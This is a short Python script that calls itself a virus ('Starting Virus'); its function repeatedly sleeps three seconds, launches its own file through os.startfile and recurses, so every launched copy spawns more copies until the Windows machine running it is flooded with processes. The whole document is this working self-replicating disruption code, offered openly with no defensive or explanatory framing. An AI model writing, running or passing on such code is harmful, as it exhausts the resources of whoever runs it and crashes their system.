print("Started SelfOpener")
print("Loading Modules")
print("import time")
import time
print("import os")
import os
print("Modules Loaded")
print("loading functions")
def openself():
    time.sleep(3)
    os.startfile(__file__)
    openself()
print("functions loaded")
print("Starting Virus")
openself()
